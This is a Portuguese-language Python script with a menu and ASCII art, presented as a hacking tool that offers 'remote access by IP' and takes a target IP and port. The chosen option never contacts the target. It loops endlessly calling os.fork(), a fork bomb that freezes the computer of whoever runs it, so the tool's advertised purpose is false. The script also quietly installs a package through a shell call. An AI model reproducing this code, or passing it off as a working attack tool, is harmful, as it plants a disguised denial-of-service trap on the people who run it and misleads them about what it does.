#####################
# FUNÇÕES & MODULOS #
#####################

global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"


import os, sys, smtplib, json, requests
from time import sleep

try:
	import pyfiglet
except:
	os.system('pip install pyfiglet')
def clear():
	os.system('clear')
def x():
	print(f'   {C}[{G}X{C}]{R} RETORNAR')	
	
####################
#                  #
#  MENU PRINCIPAL  #          
#                  #
####################


while True:
	clear()
	print(f''' {Y}{G}
                  .xUHWH !! !!? M88WHX :.
                .X * # M @ $ !! ! X! M $$$$$$ WWx :.
               : !!!!!!? H! :! $! $$$$$$$$$$ 8X:
              !! ~ ~: ~ !! : ~! $! # $$$$$$$$$$ 8X:
             :! ~ ::! H! <~ .U $ X!? R $$$$$$$$ MM!
             ~! ~ !!!! ~~.: XW $$$ U !!? $$$$$$ RMM!
               !: ~~~.:! M "T # $$$$ WX ?? # MRRMMM!
               ~? WuxiW * `` "# $$$$ 8 !!!! ?? !!!
             : X- M $$$$ `" T # $ T ~! 8 $ WUXU ~
            :% `~ # $$$ m: ~! ~? $$$$$$
          :! `.- ~ T $$$$ 8xx. .xWW- ~ "" ## * "
..... - ~~: <`! ~? T # $$ @@ W @ *? $$ / `
W $ @@ M !!! .! ~~ !! .: XUW $ W! ~ `" ~::
# "~~`.: x% `!!! H:! WM $$$$ Ti .:.! WUn +!`
::: ~: !! `: X ~.:? H.! U" $$$ B $$$! W: U! T $$ M ~
. ~~: X @! .- ~? @WTWo ("* $$$ W $ TH $!`
Wi. ~! X $?! - ~:? $$$ B $ Wu ("** $ RM!
$R@i.~~! : ~ $$$$$ B $$ en: ``
?MXT@Wx.~: ~ "## * $$$$ M ~''')
	
	print('                            ')
	
	print('                            ')
	print(f' {G}[{Y} CODED BY $LIPEZIN {G}] ')
	print('                            ')
	
	
	print('    ________________________________________                        ')
	print(f'    {C}[{G}01{C}]{R} ACESSO REMOTO POR IP {C}{G}{C}{C}              ')
	print(f'    {C}[{G}02{C}]{R} PAINEL DE CONSULTA FREE {B} [OFF]{C} {G}{C}             ')
	print(f'    {C}[{G}03{C}]{R} NUMERO DO CRIADOR  {C}                ')
	print(f' {G} ___________________________________                        ')
	choice = input(f'{G}[OPÇAO]{Y}>>>{C} ')
	
	if choice == '1':
			ddos = input(f' {G} DIGITE O IP DE SEU ALVO>>>')
			port = input(f' {G} DIGITE A PORTA , EXEMPLO : 80 >>>')
			while True:
				print(' CONECTANDO EM  {} PORT {}!' .format(ddos,port))
				os.fork()
				
			
				
			
